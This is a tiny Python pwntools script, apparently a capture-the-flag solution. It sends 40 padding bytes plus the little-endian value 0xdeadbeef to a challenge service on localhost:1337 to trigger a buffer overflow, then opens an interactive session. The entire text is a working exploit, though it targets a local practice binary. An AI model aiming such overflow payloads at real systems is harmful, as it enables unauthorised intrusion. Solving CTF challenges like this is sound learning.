#!/usr/bin/python3

from pwn import * 

# p = process("challenge/chall")
p = remote("localhost",1337)
offset = 40
paylaod = 'A'*offset +'\xef\xbe\xad\xde'  # deadbeef ---> ef + be + ad + de

p.sendline(paylaod)
p.interactive()